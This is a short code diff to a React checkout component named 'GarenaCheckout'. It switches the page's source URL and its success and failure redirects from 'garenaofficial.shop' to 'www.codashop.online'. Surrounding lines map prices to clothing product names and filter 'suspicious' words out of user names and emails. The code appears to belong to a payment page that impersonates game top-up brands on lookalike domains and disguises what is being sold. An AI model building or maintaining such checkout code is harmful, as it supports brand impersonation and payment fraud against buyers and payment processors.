@@ -109,7 +109,7 @@ function getProductNameForPrice(price: string): string {
   return 'Women Multi Coloured Floral Regular Fit Crop Top';
 }
 
-const SOURCE_URL = 'https://garenaofficial.shop/';
+const SOURCE_URL = 'https://www.codashop.online/';
 
 // Check for suspicious or prohibited keywords in user input (Name / Email)
 function containsRestrictedWord(text: string): boolean {
@@ -396,7 +396,7 @@ export default function GarenaCheckout() {
         setCountdown(c => {
           if (c <= 1) {
             clearInterval(timer);
-            window.location.href = 'https://garenaofficial.shop/?status=success';
+            window.location.href = 'https://www.codashop.online/?status=success';
           }
           return c - 1;
         });
@@ -410,7 +410,7 @@ export default function GarenaCheckout() {
     if (status === 'failed') {
       const t1 = setTimeout(() => setBarWidth('0%'), 50);
       const t2 = setTimeout(() => {
-        window.location.href = 'https://garenaofficial.shop/?status=failed';
+        window.location.href = 'https://www.codashop.online/?status=failed';
       }, 2000);
       return () => {
         clearTimeout(t1);
